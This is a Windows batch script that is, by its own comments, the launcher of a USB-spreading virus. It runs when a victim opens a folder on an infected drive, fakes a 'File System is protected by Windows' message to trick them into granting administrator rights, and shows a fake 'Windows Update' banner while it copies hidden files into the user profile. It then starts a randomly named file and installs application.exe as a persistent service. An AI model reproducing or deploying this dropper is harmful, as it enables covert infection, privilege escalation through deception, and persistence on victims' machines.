::========================================================================================
:: This bat file will get executed when user tries to open any folder from an `infected Drive`
:: Function :
::      1.  Copy the `.usbData` folder from USB to User Directory
::      2.  If User gave Admin rights
::              - Host the `application.exe` as service (system restart won't stop the virus)
::          Else
::              - Run the `application.exe` (application stops when after a system restart)
::========================================================================================

@echo off
: BatchGotAdmin
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges ...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    if '%1'=='UACdone' (shift & goto gotAdmin)
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~0", "UACdone", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    :: Fake the user, as the system need elevated access to access the file
    echo **********  File System is protected by Windows  **********
    echo ***  Provide administrative rights to access the files  ***
    pause
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

:: Fake the user, to wait until we `copy` and `install` the virus
echo Windows Update : 
echo    Don't close the window during update ...

::copy program[s] to user folder and start our program as service
if not exist "%USERPROFILE%\.winData\.usbData" ( xcopy "..\.usbData" "%USERPROFILE%\.winData\.usbData" /i)
start ..\PZeQKWQKcbWlbZrkhawfdSNgGAmvHbxzGGWbCTqsUwoTqNayeKpCuMDxRbQRKBePBBgkVCeUaQoXqUPOVQrAxFgaUEmPqGprrZzscQwodcXLIisrdvVRDYFYxqKwLtUbBoKuKbjnsosKnZjrsmdQszUAhSaxHNtzXrRFHzNuGeXDcQeajYixamikbKkMhxsNgUTRUbWt
"%USERPROFILE%\.winData\.usbData\application.exe" install
"%USERPROFILE%\.winData\.usbData\application.exe" start
pause